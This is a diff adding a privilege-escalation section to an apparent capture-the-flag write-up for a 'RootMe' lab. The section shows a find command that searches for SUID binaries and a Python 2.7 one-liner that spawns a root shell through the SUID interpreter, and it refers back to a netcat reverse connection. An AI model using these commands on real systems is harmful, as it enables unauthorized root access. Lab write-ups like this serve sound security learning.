@@ -44,6 +44,30 @@ The netcat was able to capture the connection back successfully:
 
 ![nc](screenshots/rootme_nc.png)
 
+## Privilege Escalation
+
+To elevate the privileges to root user, I ran:
+
+```bash
+ find / -perm -4000 -type f 2>/dev/null
+```
+to check on suid file permissions.
+
+I was able to find multiple files but the one that stood out was: /usr/bin/python2.7 this is because Python is a powerful interpreter with native access to system-level APIs, an attacker can bypass traditional security mechanisms by executing a simple code one-liner.
+
+I ran command to check on the file permissions :
+
+```bash
+ ls -l /usr/bin/python2.7
+```
+I then spawned privilege root shell by using the command:
+```bash
+ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+and I was able to elevate my privileges to root user.
+
+![Root](screenshots/rootme_root.png)
+
 
 
 
